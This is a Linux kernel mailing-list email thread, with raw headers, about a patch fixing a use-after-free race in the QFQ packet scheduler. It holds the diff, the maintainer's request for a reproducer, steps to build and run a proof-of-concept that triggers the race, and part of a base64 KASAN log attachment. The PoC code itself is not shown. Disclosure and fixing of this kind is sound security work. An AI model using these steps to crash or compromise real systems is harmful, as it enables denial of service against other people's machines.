Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.221.182
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1792770339;
	b=c52bvAQsrqz2HGruE7PJmx46oGgoKg6p5Q/D5rsChVfIFwO6jtWjyR5C0BWsYy5QEkZO
	 teFAmuDPvbxu3a+8nVD7jJIReUyIruxuVoLwnUv+hbEtR+bbEtLSRBc+Utjf86UPV38mE
	 H/7XXHX6FkjSVfKwQWAGFQQlmVkN6jZ2pw8XjRZBOSWqZCB2pIkbUBtc+VwzPK1WxC+Sc
	 66C+n2wfjsAjQIZK899P5Y79p+zB7BdfXWzp73lZ7C5h4kmRGjpyCBlS2GCn5k1BHs/oQ
	 Lbyk0x5noaqGSdPYVySZw9VF7HRW9oU9rd/xKHl4AUE3lsBJPMn1skGKAXaA8E/shCg==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792770339;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
	 Message-ID:Subject:To:Cc:Content-Type;
	bh=hfguzZZleCmI6SMz8lvyrw5PwkBQrdKlCegPj/+h3So=;
	b=S8H8BtPWZDpjg6l/GD84xPB12Tf57YFfw7fUSxvT0sC1ZDfx4qEsysqzjUeIIgIuJrhx
	 occbKarr5k/MfjB01h+1SQb9tWVSEOes2VM7sMwd5QYAeubE1F75NquqnKtlmaBeDuhQ3
	 JfUgb8imc+wgdCYa6EQ1c/SNxpL+0VOxqVi15tqk4YpxLPajUZfGbWe1qNeLITCPds8Qz
	 PQTod4cQCbCYrAXUqaQf3BpsCHR79sZO9uV1V8wntM4+4wIitwzwSsdTV0PTFfByOtbsG
	 vChypGvCyJ6IUXGULkhGOxWkgcm/tQdvFAsUL5r5umNnceSPWMXJBXtWpLCvw+uYFAA==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=trailofbits.com;
	spf=pass smtp.mailfrom=trailofbits.com;
	dkim=pass header.d=trailofbits.com header.i=@trailofbits.com header.a=rsa-sha256 header.s=google header.b=DsMP9qBX;
	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.221.182
Received: from mail-vk1-f182.google.com (mail-vk1-f182.google.com [209.85.221.182])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F015C606A323
	for <netdev@vger.kernel.org>; Fri, 23 Oct 2026 15:45:37 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org F015C606A323
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=trailofbits.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=trailofbits.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=trailofbits.com header.i=@trailofbits.com header.a=rsa-sha256 header.s=google header.b=DsMP9qBX
Received: by mail-vk1-f182.google.com with SMTP id 71dfb90a1353d-5eaf169fe3dso354130e0c.3
        for <netdev@vger.kernel.org>; Fri, 23 Oct 2026 08:45:37 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1792770337; cv=none;
        d=google.com; s=arc-20260327;
        b=VLM5tZTIiOchNTloHlcwSQArJUzI6NcwA9z1fk2Iovra9iiE9X1iTtMI4yohZyHUMu
         S7yGTm5E5vbMCot3jP/PM0dMmuAVpTdRwonxJ6kzqUPziIFRKpK7rmRtrX64EUugnHtP
         YpFWELI7kUfkGJv8nNtQmVZVUfjQLgka+WLLGZoB/OVDyWvsXRDj9zh/5rHfpjtgeoIU
         8ERZevcP8xFceZqGcFzsnKF47nzsAoiuRIOHMT9s8GQhoU80f0huRh9o8MWMvKcxUZGn
         2jmxri9hPPXLTOIpM1Eb2Vu6iifkHyX2N9uYM1n6mral96uLXbyfIqpoE5GV0JVOcdLZ
         eSAg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:dkim-signature;
        bh=hfguzZZleCmI6SMz8lvyrw5PwkBQrdKlCegPj/+h3So=;
        fh=3X5y8wmeAyCRJMwmaNFyUcNpv4faQpy2UGwzth41CPs=;
        b=JOZmWy6/1fAPvXWMubu3707ST+Ffvky6PSzfgdjAXRZrcmRFhvEE8lZVOwVlXCVS2p
         DFvBG29peElm7jA4bTx0c3Bf36bc+eAA8fMIGmUVypnOOWOomx83/QvyhGE4FnSHx/F1
         jK48iVM3qTN8CEjCWmLIqT3FGJM5Juveipa2x7rI1fuqTCgsnfyxnD4a8o+Engqiv4QI
         d7XLTv2vaoBVf1dCBtl2jjWncirXrZ0RFOjYgOpNV8TFTSAvkjc/VzJ/b4VT0xuwJFFl
         tGzHAm6C+dr+VHugIp9LfBzGkgPZgSKRP3nHfjpNo+baYb2ZlKsfu5RZAeCG9vuIwy2A
         ZsVg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=trailofbits.com; s=google; t=1792770337; x=1793375137; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=hfguzZZleCmI6SMz8lvyrw5PwkBQrdKlCegPj/+h3So=;
        b=DsMP9qBXDwHUieF1G9r/h9Z162V4gt8ChRwTgItefWETx8ZnWUNXiFNbebzDgbvrZm
         ojfI1GgZRO/EejN677m+T4CAje7XnwtncL8zTcUs67qqqS3G1NxBQhIx1eVqgXZMvuD3
         MbnJBdiRxTFCAqtjO1KB6Q1NpfOc3TcxuYoLZ94Xbb1CMztEFdK+wZECFyw/cnTlb7ll
         1ERKqi1sTWUOGz95rSa3Qnq3okQm+R9zuLHZzpXoyHriSMGzJYKD3w4m0AzL/FscJhoQ
         TV/a8x5nT3vZI6Y8oRfuaRdSgHtEPpgZnkgNh26njDhST1PoY3yM4ZUR/mPMkHJcJZaM
         AD1g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792770337; x=1793375137;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=hfguzZZleCmI6SMz8lvyrw5PwkBQrdKlCegPj/+h3So=;
        b=zZKcRVuAAyUEvzbR4McZ8J3G1ERrpeOzQ3Sgfrpq7d7n00zpy7jft4TiKhTMkVDxLq
         r5fkj8cbuArF8I7wNuNbghcS8GP/g1WwuprZ55BiQ/+i1KRjWJjFAt10ZouOuhq5Qd7M
         FNCJ4jT2oDRe04XQHUy6av3nrz8C+HHtJrbmAR2dFUv7g39o41aLR/FLEAozR51XaM2H
         TWkbDuyNsV/nGyKu5l8/cn1i449jbst36mFAOX9MS6Xv8mHloxmfk8BIHOXBnJxzJxy2
         NdeW738ibA/vlYwj+tE5OvuFOEdQcfoxh2iq6AtIpAUao/+exxeZeM/ojma8ABk1ThYt
         JI0A==
X-Forwarded-Encrypted: i=1; AKwUvBzyTHTzbX4eSH2U9bZwlCkiNxLAm3f8IkC5+zoJTmUOzzojr2AWMoPWjXcCPGZZLBHOIZLeC+g=@vger.kernel.org
X-Gm-Message-State: AFq9FYLjPtZgwC3DrkOq+mpcPD8boAcpPd1gFeiZdVfYvIpnBE+B6DS1
	u1P7aMsIHdV1f1LYOngqvt+10h5IGujE8n29VdNfjMII+1qAMlPLjKPIvBXG/jaMi4JkctIzuLS
	VhMMM7iTNLF6CQL5mY1Dv6DCtp93cdJ9WKOVKSGjntQ==
X-Gm-Gg: AYBFou0JNEzibJ1TW2e5gFuqR4dtjlJNBm7PSyhsOpuCmuUVGb5MFYq0jdLvWq8XqcX
	yMlIczmcFEnFdDbCqC2r75eIP+CxeAtrgJwi7ihwYmHlzTzR+lEUu2aOPNLIQKx5FbKXnhZg8/F
	gtd2VLGaucY4A/DH3H+wPjjxfq/w1f1WzdNFqld0feAVG+UhibaSGxH3vx5rcJIpGQgEddXEsuq
	KYie/Ro7U3NpGUEHVzRJkH6kk1M2/UGF8lP7ul/X4NT19VPzTFOkBhKyimARtOf726pl+t7mSrh
	HXHPIXHfDmEXSPxL5EI10pJ+ws7zoapQui/DH4xwRL5kvcTqjUTAU+9PIKtxmLq+71jpjXPPSsV
	R/hNFUsspjPDy496Xa2Phmq+5sX9n/1ZLogs2T+/H36LYeJygA2FM3kPopfMzmVEmVfnLD4ylXF
	JA1spVS751rfMo42GxjFuR54V02A==
X-Received: by 2002:a05:6122:3a14:b0:5ea:d649:d1bc with SMTP id
 71dfb90a1353d-5ec14b2417emr953418e0c.18.1792770336747; Fri, 23 Oct 2026
 08:45:36 -0700 (PDT)
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
References: <20260731140533.566493-1-david.lee@trailofbits.com>
 <CAM0EoM=UDkGKLivsdDS5JaVMuefR4jLC2rAWJcOR8XD-4N_EgA@mail.gmail.com>
 <CAC_etQESLytW5rhp0GfZU-mJqJhwk202a5u_nTXZ7W6wJN=AJw@mail.gmail.com>
 <CAC_etQHv2EBYfAhfkYHKrasnJAyDS+u5+a4os4aD1eSmKrck_A@mail.gmail.com> <CAM0EoMm=KbZgcGqLHDFee3mM1GxuNCvAWObP_K4AxsGAoEAedg@mail.gmail.com>
In-Reply-To: <CAM0EoMm=KbZgcGqLHDFee3mM1GxuNCvAWObP_K4AxsGAoEAedg@mail.gmail.com>
From: David Lee <david.lee@trailofbits.com>
Date: Fri, 23 Oct 2026 11:45:24 -0400
X-Gm-Features: AclHuK8CLiXXzSmxDSFp0E6e0bDszdfNFRuQ8ojlKb91BnJkIKL8uqwY4pYaOKo
Message-ID: <CAC_etQGXyhHe4vowrM4wLmhid56JcdsQZXdM+SFM-ZMnmG9wwg@mail.gmail.com>
Subject: Re: [PATCH] net/sched: sch_qfq: prevent aggregate self-replacement
To: Jamal Hadi Salim <jhs@mojatatu.com>
Cc: jiri@resnulli.us, davem@davemloft.net, edumazet@google.com, 
	kuba@kernel.org, pabeni@redhat.com, Kyle Zeng <kylebot@openai.com>, 
	"Dominik 'Disconnect3d' Czarnota" <dominik.czarnota@trailofbits.com>, horms@kernel.org, netdev@vger.kernel.org, 
	linux-kernel@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000164bd3065e83df67"

--000000000000164bd3065e83df67
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Jamal,

I reproduced the issue on upstream Linux at commit
734bef548a96e8774d6eef5dfa2026c6edc4e80b using the original PoC,
confirming that it is still present at that revision.

I've attached the KASAN log, the PoC, reproduction steps, and the bug repor=
t.

For reference, the original patch thread is:
https://lore.kernel.org/netdev/20260731140533.566493-1-david.lee@trailofbit=
s.com/

Best regards,
David


On Thu, 22 Oct 2026 05:14:38 -0400, Jamal Hadi Salim <jhs@mojatatu.com> wro=
te:
> On Wed, Oct 21, 2026 at 10:56=E2=80=AFAM David Lee <david.lee@trailofbits=
.com> wrote:
> >
> > Hi Jamal,
> >
> > Following up on this thread. Please let me know if you had a chance to =
review the attached reproducer or if you need any additional information.
> >
>
> Please resend to the list - I lost track.
> And if you follow up after like 2 months(!) you will really have to
> retest with the new kernel and likely look at the list to see if there
> are other fixes that cover this issue.
>
>
> cheers,
> jamal
>
> > Best regards,
> >
> >
> >
> > On Mon, Aug 10, 2026 at 11:22=E2=80=AFAM David Lee <david.lee@trailofbi=
ts.com> wrote:
> >>
> >> Hi Jamal,
> >>
> >> Reproducer has been attached to this email.
> >>
> >> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D Reproduction =3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D
> >>
> >> 1. Build Linux at 82a47586c0b9266622657009aa30573dddf09f53
> >>    with the configuration options listed above and KASAN enabled.
> >>    Use a system with at least two CPUs. If QFQ is configured as a
> >>    module, make sch_qfq available before running the reproducer.
> >>
> >> 2. Build the attached poc.c:
> >>
> >> ~
> >> gcc -static -O2 -pthread -Wall -Wextra -o poc poc.c
> >> ~
> >>
> >> 3. Run the resulting binary:
> >>
> >> ~
> >> ./poc
> >> ~
> >>
> >> The reproducer creates user and network namespaces, brings up the
> >> loopback device, installs a QFQ qdisc and class, and races class
> >> changes against packet enqueue. Race timing varies between systems.
> >> On the validated KASAN kernel, the expected result is a
> >> slab-use-after-free report in qfq_add_to_agg(), followed by a kernel
> >> panic. The full observed output is attached as splash.txt.
> >>
> >> he issue was reproduced on Linux 7.2-rc3 at:
> >>
> >> 82a47586c0b9266622657009aa30573dddf09f53
> >>
> >> It is also present in Linux 7.2-rc5 at:
> >>
> >> f5098b6bae761e346ebcd9da7f95622c04733cff
> >>
> >> As of July 27, 2026, the vulnerable sequence remains in upstream
> >> master at:
> >>
> >> 62cc90241548d5570ee68e01aaba6506964e9811
> >> https://github.com/torvalds/linux/commit/62cc90241548d5570ee68e01aaba6=
506964e9811
> >>
> >> Required configuration:
> >>
> >> * CONFIG_NET_SCHED
> >> * CONFIG_NET_SCH_QFQ
> >>
> >> The attached reproducer additionally requires:
> >>
> >> * CONFIG_USER_NS
> >> * CONFIG_NET_NS
> >> * CONFIG_INET
> >>
> >> KASAN is recommended to observe the first invalid access.
> >>
> >> Regarding the format, I can send v2 if the reproducer looks good on yo=
ur end.
> >>
> >> Thank you.
> >>
> >> Best regards,
> >> David
> >>
> >> On Fri, Jul 31, 2026 at 12:33=E2=80=AFPM Jamal Hadi Salim <jhs@mojatat=
u.com> wrote:
> >>>
> >>> On Fri, Jul 31, 2026 at 10:05=E2=80=AFAM David Lee <david.lee@trailof=
bits.com> wrote:
> >>> >
> >>> > qfq_change_class() snapshots the current aggregate settings while
> >>> > holding the qdisc tree lock, but drops the lock before selecting th=
e
> >>> > destination aggregate. During that gap, qfq_enqueue() can move the
> >>> > class to an aggregate matching the requested settings.
> >>> >
> >>> > When qfq_change_class() resumes, qfq_find_agg() then returns cl->ag=
g.
> >>> > If it is a singleton, qfq_deact_rm_from_agg() frees the aggregate
> >>> > before qfq_add_to_agg() immediately accesses the same pointer, caus=
ing
> >>> > a use-after-free.
> >>> >
> >>> > While holding the tree lock, skip the replacement when the destinat=
ion
> >>> > is already the current aggregate. Any estimator replacement has alr=
eady
> >>> > completed, so the class change can finish normally.
> >>> >
> >>> > Fixes: 462dbc9101ac ("pkt_sched: QFQ Plus: fair-queueing service at=
 DRR cost")
> >>> > Bug found and triaged by OpenAI Security Research and
> >>> > validated by Trail of Bits.
> >>> >
> >>>
> >>> Please always send a reproducer - either as a tdc test case or if it
> >>> is sensitive send it privately to me and Cc the other maintainers.
> >>> As trivial as this looks I will not look at it without a repro.
> >>>
> >>> cheers,
> >>> jamal
> >>>
> >>> > Assisted-by: Codex:gpt-5.6-sol gpt-5.5-cyber
> >>> > Signed-off-by: Kyle Zeng <kylebot@openai.com>
> >>> > ---
> >>> > Trail of Bits has a reproducer for this bug that triggers a
> >>> > KASAN use-after-free and can share if needed.
> >>> >
> >>> >  net/sched/sch_qfq.c | 3 +++
> >>> >  1 file changed, 3 insertions(+)
> >>> >
> >>> > diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
> >>> > index 6f3b7273c..e900890e9 100644
> >>> > --- a/net/sched/sch_qfq.c
> >>> > +++ b/net/sched/sch_qfq.c
> >>> > @@ -517,11 +517,14 @@ static int qfq_change_class(struct Qdisc *sch=
, u32 classid, u32 parentid,
> >>> >                 sch_tree_lock(sch);
> >>> >                 qfq_init_agg(q, new_agg, lmax, weight);
> >>> >         }
> >>> > +       if (existing && new_agg =3D=3D cl->agg)
> >>> > +               goto unlock;
> >>> >         if (existing)
> >>> >                 qfq_deact_rm_from_agg(q, cl);
> >>> >         else
> >>> >                 qdisc_class_hash_insert(&q->clhash, &cl->common);
> >>> >         qfq_add_to_agg(q, new_agg, cl);
> >>> > +unlock:
> >>> >         sch_tree_unlock(sch);
> >>> >         qdisc_class_hash_grow(sch, &q->clhash);
> >>> >
> >>> > --
> >>> > 2.53.0
> >
> >
> >
> > --
> > David Lee
> > Security Engineer I, Application Security | Trail of Bits
> > trailofbits.com

--000000000000164bd3065e83df67
Content-Type: text/plain; charset="US-ASCII"; name="full_kasan.log"
Content-Disposition: attachment; filename="full_kasan.log"
Content-Transfer-Encoding: base64
Content-ID: <>
X-Attachment-Id: 

TGludXggdmVyc2lvbiA3LjMuMC1wYWNrYWdlMS0xMCAocm9vdEA4MTA1YzQ5Y2ExOTIpICh4ODZf
NjQtbGludXgtZ251LWdjYyAoRGViaWFuIDE0LjIuMC0xOSkgMTQuMi4wLCBHTlUgbGQgKEdOVSBC
aW51dGlscyBmb3IgRGViaWFuKSAyLjQ0KSAjMiBTTVAgUFJFRU1QVCBGcmkgT2N0IDIzIDE1OjE4
OjQ1IFVUQyAyMDI2DQpDb21tYW5kIGxpbmU6IGNvbnNvbGU9dHR5UzAgcmRpbml0PS9pbml0IG5v
a2FzbHIgb29wcz1wYW5pYyBwYW5pY19vbl93YXJuPTEgcGFuaWM9MSBrYXNhbi5mYXVsdD1wYW5p
Yw0KQklPUy1wcm92aWRlZCBwaHlzaWNhbCBSQU0gbWFwOg0KQklPUy1lODIwOiBbbWVtIDB4MDAw
MDAwMDAwMDAwMDAwMC0weDAwMDAwMDAwMDAwOWZiZmZdICBTeXN0ZW0gUkFNDQpCSU9TLWU4MjA6
IFttZW0gMHgwMDAwMDAwMDAwMDlmYzAwLTB4MDAwMDAwMDAwMDA5ZmZmZl0gIGRldmljZSByZXNl
cnZlZA0KQklPUy1lODIwOiBbZ2FwIDB4MDAwMDAwMDAwMDBhMDAwMC0weDAwMDAwMDAwMDAwZWZm
ZmZdDQpCSU9TLWU4MjA6IFttZW0gMHgwMDAwMDAwMDAwMGYwMDAwLTB4MDAwMDAwMDAwMDBmZmZm
Zl0gIGRldmljZSByZXNlcnZlZA0KQklPUy1lODIwOiBbbWVtIDB4MDAwMDAwMDAwMDEwMDAwMC0w
eDAwMDAwMDAwN2ZmZGZmZmZdICBTeXN0ZW0gUkFNDQpCSU9TLWU4MjA6IFttZW0gMHgwMDAwMDAw
MDdmZmUwMDAwLTB4MDAwMDAwMDA3ZmZmZmZmZl0gIGRldmljZSByZXNlcnZlZA0KQklPUy1lODIw
OiBbZ2FwIDB4MDAwMDAwMDA4MDAwMDAwMC0weDAwMDAwMDAwYWZmZmZmZmZdDQpCSU9TLWU4MjA6
IFttZW0gMHgwMDAwMDAwMGIwMDAwMDAwLTB4MDAwMDAwMDBiZmZmZmZmZl0gIGRldmljZSByZXNl
cnZlZA0KQklPUy1lODIwOiBbZ2FwIDB4MDAwMDAwMDBjMDAwMDAwMC0weDAwMDAwMDAwZmVkMWJm
ZmZdDQpCSU9TLWU4MjA6IFttZW0gMHgwMDAwMDAwMGZlZDFjMDAwLTB4MDAwMDAwMDBmZWQxZmZm
Zl0gIGRldmljZSByZXNlcnZlZA0KQklPUy1lODIwOiBbZ2FwIDB4MDAwMDAwMDBmZWQyMDAwMC0w
eDAwMDAwMDAwZmZmYmZmZmZdDQpCSU9TLWU4MjA6IFttZW0gMHgwMDAwMDAwMGZmZmMwMDAwLTB4
MDAwMDAwMDBmZmZmZmZmZl0gIGRldmljZSByZXNlcnZlZA0KQklPUy1lODIwOiBbZ2FwIDB4MDAw
MDAwMDEwMDAwMDAwMC0weDAwMDAwMGZjZmZmZmZmZmZdDQpCSU9TLWU4MjA6IFttZW0gMHgwMDAw
MDBmZDAwMDAwMDAwLTB4MDAwMDAwZmZmZmZmZmZmZl0gIGRldmljZSByZXNlcnZlZA0KTlggKEV4
ZWN1dGUgRGlzYWJsZSkgcHJvdGVjdGlvbjogYWN0aXZlDQpBUElDOiBTdGF0aWMgY2FsbHMgaW5p
dGlhbGl6ZWQNCnRzYzogRmFzdCBUU0MgY2FsaWJyYXRpb24gdXNpbmcgUElUDQp0c2M6IERldGVj
dGVkIDk5OS45OTkgTUh6IHByb2Nlc3Nvcg0KbGFzdF9wZm4gPSAweDdmZmUwIG1heF9hcmNoX3Bm
biA9IDB4MTAwMDAwMDAwMDANCng4Ni9QQVQ6IFBBVCBzdXBwb3J0IGRpc2FibGVkIGJlY2F1c2Ug
Q09ORklHX1g4Nl9QQVQgaXMgZGlzYWJsZWQgaW4gdGhlIGtlcm5lbC4NCng4Ni9QQVQ6IENvbmZp
Z3VyYXRpb24gWzAtN106IFdCICBXVCAgVUMtIFVDICBXQiAgV1QgIFVDLSBVQyAgDQpmb3VuZCBT
TVAgTVAtdGFibGUgYXQgW21lbSAweDAwMGY1NDgwLTB4MDAwZjU0OGZdDQpVc2luZyBHQiBwYWdl
cyBmb3IgZGlyZWN0IG1hcHBpbmcNClJBTURJU0s6IFttZW0gMHg3ZmUwODAwMC0weDdmZmRmZmZm
XQ0KQUNQSTogRWFybHkgdGFibGUgY2hlY2tzdW0gdmVyaWZpY2F0aW9uIGRpc2FibGVkDQpBQ1BJ
OiBSU0RQIDB4MDAwMDAwMDAwMDBGNTJDMCAwMDAwMTQgKHYwMCBCT0NIUyApDQpBQ1BJOiBSU0RU
IDB4MDAwMDAwMDA3RkZFMjMzQiAwMDAwMzggKHYwMSBCT0NIUyAgQlhQQyAgICAgMDAwMDAwMDEg
QlhQQyAwMDAwMDAwMSkNCkFDUEk6IEZBQ1AgMHgwMDAwMDAwMDdGRkUyMTJCIDAwMDBGNCAodjAz
IEJPQ0hTICBCWFBDICAgICAwMDAwMDAwMSBCWFBDIDAwMDAwMDAxKQ0KQUNQSTogRFNEVCAweDAw
MDAwMDAwN0ZGRTAwNDAgMDAyMEVCICh2MDEgQk9DSFMgIEJYUEMgICAgIDAwMDAwMDAxIEJYUEMg
MDAwMDAwMDEpDQpBQ1BJOiBGQUNTIDB4MDAwMDAwMDA3RkZFMDAwMCAwMDAwNDANCkFDUEk6IEFQ
SUMgMHgwMDAwMDAwMDdGRkUyMjFGIDAwMDA4MCAodjAzIEJPQ0hTICBCWFBDICAgICAwMDAwMDAw
MSBCWFBDIDAwMDAwMDAxKQ0KQUNQSTogSFBFVCAweDAwMDAwMDAwN0ZGRTIyOUYgMDAwMDM4ICh2
MDEgQk9DSFMgIEJYUEMgICAgIDAwMDAwMDAxIEJYUEMgMDAwMDAwMDEpDQpBQ1BJOiBNQ0ZHIDB4
MDAwMDAwMDA3RkZFMjJENyAwMDAwM0MgKHYwMSBCT0NIUyAgQlhQQyAgICAgMDAwMDAwMDEgQlhQ
QyAwMDAwMDAwMSkNCkFDUEk6IFdBRVQgMHgwMDAwMDAwMDdGRkUyMzEzIDAwMDAyOCAodjAxIEJP
Q0hTICBCWFBDICAgICAwMDAwMDAwMSBCWFBDIDAwMDAwMDAxKQ0KQUNQSTogUmVzZXJ2aW5nIEZB
Q1AgdGFibGUgbWVtb3J5IGF0IFttZW0gMHg3ZmZlMjEyYi0weDdmZmUyMjFlXQ0KQUNQSTogUmVz
ZXJ2aW5nIERTRFQgdGFibGUgbWVtb3J5IGF0IFttZW0gMHg3ZmZlMDA0MC0weDdmZmUyMTJhXQ0K
QUNQSTogUmVzZXJ2aW5nIEZBQ1MgdGFibGUgbWVtb3J5IGF0IFttZW0gMHg3ZmZlMDAwMC0weDdm
ZmUwMDNmXQ0KQUNQSTogUmVzZXJ2aW5nIEFQSUMgdGFibGUgbWVtb3J5IGF0IFttZW0gMHg3ZmZl
MjIxZi0weDdmZmUyMjllXQ0KQUNQSTogUmVzZXJ2aW5nIEhQRVQgdGFibGUgbWVtb3J5IGF0IFtt
ZW0gMHg3ZmZlMjI5Zi0weDdmZmUyMmQ2XQ0KQUNQSTogUmVzZXJ2aW5nIE1DRkcgdGFibGUgbWVt
b3J5IGF0IFttZW0gMHg3ZmZlMjJkNy0weDdmZmUyMzEyXQ0KQUNQSTogUmVzZXJ2aW5nIFdBRVQg
dGFibGUgbWVtb3J5IGF0IFttZW0gMHg3ZmZlMjMxMy0weDdmZmUyMzNhXQ0KS2VybmVsQWRkcmVz
c1Nhbml0aXplciBpbml0aWFsaXplZCAoZ2VuZXJpYykNCkFDUEk6IFBNLVRpbWVyIElPIFBvcnQ6
IDB4NjA4DQpBQ1BJOiBMQVBJQ19OTUkgKGFjcGlfaWRbMHhmZl0gZGZsIGRmbCBsaW50WzB4MV0p
DQpJT0FQSUNbMF06IGFwaWNfaWQgMCwgdmVyc2lvbiAzMiwgYWRkcmVzcyAweGZlYzAwMDAwLCBH
U0kgMC0yMw0KQUNQSTogSU5UX1NSQ19PVlIgKGJ1cyAwIGJ1c19pcnEgMCBnbG9iYWxfaXJxIDIg
ZGZsIGRmbCkNCkFDUEk6IElOVF9TUkNfT1ZSIChidXMgMCBidXNfaXJxIDUgZ2xvYmFsX2lycSA1
IGhpZ2ggbGV2ZWwpDQpBQ1BJOiBJTlRfU1JDX09WUiAoYnVzIDAgYnVzX2lycSA5IGdsb2JhbF9p
cnEgOSBoaWdoIGxldmVsKQ0KQUNQSTogSU5UX1NSQ19PVlIgKGJ1cyAwIGJ1c19pcnEgMTAgZ2xv
YmFsX2lycSAxMCBoaWdoIGxldmVsKQ0KQUNQSTogSU5UX1NSQ19PVlIgKGJ1cyAwIGJ1c19pcnEg
MTEgZ2xvYmFsX2lycSAxMSBoaWdoIGxldmVsKQ0KQUNQSTogVXNpbmcgQUNQSSAoTUFEVCkgZm9y
IFNNUCBjb25maWd1cmF0aW9uIGluZm9ybWF0aW9uDQpBQ1BJOiBIUEVUIGlkOiAweDgwODZhMjAx
IGJhc2U6IDB4ZmVkMDAwMDANCkNQVSB0b3BvOiBNYXguIGxvZ2ljYWwgcGFja2FnZXM6ICAgMQ0K
Q1BVIHRvcG86IE1heC4gbG9naWNhbCBub2RlczogICAgICAxDQpDUFUgdG9wbzogTnVtLiBub2Rl
cyBwZXIgcGFja2FnZTogIDENCkNQVSB0b3BvOiBNYXguIGxvZ2ljYWwgZGllczogICAgICAgMQ0K
Q1BVIHRvcG86IE1heC4gZGllcyBwZXIgcGFja2FnZTogICAxDQpDUFUgdG9wbzogTWF4LiB0aHJl
YWRzIHBlciBjb3JlOiAgIDENCkNQVSB0b3BvOiBOdW0uIGNvcmVzIHBlciBwYWNrYWdlOiAgICAg
Mg0KQ1BVIHRvcG86IE51bS4gdGhyZWFkcyBwZXIgcGFja2FnZTogICAyDQpDUFUgdG9wbzogQWxs
b3dpbmcgMiBwcmVzZW50IENQVXMgcGx1cyAwIGhvdHBsdWcgQ1BVcw0KW2dhcCAweGMwMDAwMDAw
LTB4ZmVkMWJmZmZdIGF2YWlsYWJsZSBmb3IgUENJIGRldmljZXMNCmNsb2Nrc291cmNlOiByZWZp
bmVkLWppZmZpZXM6IG1hc2s6IDB4ZmZmZmZmZmYgbWF4X2N5Y2xlczogMHhmZmZmZmZmZiwgbWF4
X2lkbGVfbnM6IDc2NDU1MTk2MDAyMTE1NjggbnMNClpvbmUgcmFuZ2VzOg0KICBETUEzMiAgICBb
bWVtIDB4MDAwMDAwMDAwMDAwMTAwMC0weDAwMDAwMDAwN2ZmZGZmZmZdDQogIE5vcm1hbCAgIGVt
cHR5DQpNb3ZhYmxlIHpvbmUgc3RhcnQgZm9yIGVhY2ggbm9kZQ0KRWFybHkgbWVtb3J5IG5vZGUg
cmFuZ2VzDQogIG5vZGUgICAwOiBbbWVtIDB4MDAwMDAwMDAwMDAwMTAwMC0weDAwMDAwMDAwMDAw
OWVmZmZdDQogIG5vZGUgICAwOiBbbWVtIDB4MDAwMDAwMDAwMDEwMDAwMC0weDAwMDAwMDAwN2Zm
ZGZmZmZdDQpJbml0bWVtIHNldHVwIG5vZGUgMCBbbWVtIDB4MDAwMDAwMDAwMDAwMTAwMC0weDAw
MDAwMDAwN2ZmZGZmZmZdDQpPbiBub2RlIDAsIHpvbmUgRE1BMzI6IDEgcGFnZXMgaW4gdW5hdmFp
bGFibGUgcmFuZ2VzDQpPbiBub2RlIDAsIHpvbmUgRE1BMzI6IDk3IHBhZ2VzIGluIHVuYXZhaWxh
YmxlIHJhbmdlcw0KT24gbm9kZSAwLCB6b25lIERNQTMyOiAzMiBwYWdlcyBpbiB1bmF2YWlsYWJs
ZSByYW5nZXMNCnNldHVwX3BlcmNwdTogTlJfQ1BVUzoyIG5yX2NwdW1hc2tfYml0czoyIG5yX2Nw
dV9pZHM6MiBucl9ub2RlX2lkczoxDQpwZXJjcHU6IEVtYmVkZGVkIDU4IHBhZ2VzL2NwdSBzMjA1
OTc2IHIwIGQzMTU5MiB1MTA0ODU3Ng0KS2VybmVsIGNvbW1hbmQgbGluZTogY29uc29sZT10dHlT
MCByZGluaXQ9L2luaXQgbm9rYXNsciBvb3BzPXBhbmljIHBhbmljX29uX3dhcm49MSBwYW5pYz0x
